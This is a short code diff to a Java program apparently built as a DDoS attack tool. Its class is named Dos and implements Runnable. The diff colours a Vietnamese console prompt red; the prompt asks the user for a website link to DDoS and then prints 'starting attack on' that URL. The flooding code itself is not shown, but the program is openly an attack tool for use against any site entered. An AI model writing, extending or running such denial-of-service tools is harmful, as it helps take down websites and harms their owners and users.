@@ -48,11 +48,12 @@ public class Dos implements Runnable {
 
 
     public static void main(String[] args) throws Exception {
+        String ANSI_RED = "\u001B[31m";
         String url = "";
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("Điền link website cần DDoS: ");
+        System.out.print(ANSI_RED + "Điền link website cần DDoS: ");
         url = in.nextLine();
         System.out.println("\n");
         System.out.println("Bắt đầu tấn công vào: " + url);
